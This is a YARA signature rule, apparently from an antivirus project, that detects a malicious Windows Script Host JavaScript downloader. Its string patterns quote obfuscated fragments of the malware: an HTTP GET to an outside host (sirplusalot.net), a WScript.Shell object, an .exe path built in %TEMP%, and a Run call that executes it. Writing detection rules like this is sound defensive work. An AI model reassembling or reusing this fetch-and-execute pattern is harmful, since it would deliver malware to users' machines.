rule sig_20160401_71b67d29468520462967e4c75b0aef98 {
  meta:
    description = "datamaliciousorder - file 20160401_71b67d29468520462967e4c75b0aef98.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3dd33b91211083f638be5a272a81d235a53a0feb6c624f7e555b91d86b8bf24e"

  strings:
    $s1  = "XxVzg[IhiDv](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s2  = "var LmlZts = function YtAd() {return WScript[GqJc](\"WScript\"+\".Shell\");}(), McNae = 11;" fullword ascii
    $s3  = "function MrAjn(BikUfe, ZqAo){QnjZt = QnjZt * 1; return BikUfe - ZqAo;};" fullword ascii
    $s4  = "if (XxVzg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GrVbh() {return LmlZts[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"strtVC047WOJ.ex\" + \"e\";};" fullword ascii
    $s6  = "function YotFaj(){return TrXi + \"\";};" fullword ascii
    $s7  = "function VjRia() {return ((RawVs == true) && (RawVs == QlAul)) ? 1 : QnjZt;};" fullword ascii
    $s8  = "var LifTbz = new this[\"Date\"]();" fullword ascii
    $s9  = "function VwZmw(){return GqJc;};" fullword ascii
    $s10 = "function ZpjCem()" fullword ascii
    $s11 = "QlAul = true; " fullword ascii
    $s12 = "var RawVs = false;" fullword ascii
    $s13 = "RawVs = true; " fullword ascii
    $s14 = "}while (DhaKa);" fullword ascii
    $s15 = "return MrAjn(TbXi, SeGt);" fullword ascii
    $s16 = "function IoVuv(){return 23;};" fullword ascii
    $s17 = "function PoDfj(IyEc){LmlZts[\"R\"+\"un\"](IyEc, QnjZt, QnjZt);};" fullword ascii
    $s18 = "function GnFm(UjxDfw) {var RwYht = (1, 2, 3, 4, 5, UjxDfw); return RwYht;};" fullword ascii
    $s19 = "var QlAul = false;" fullword ascii
    $s20 = "var RwiAi = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}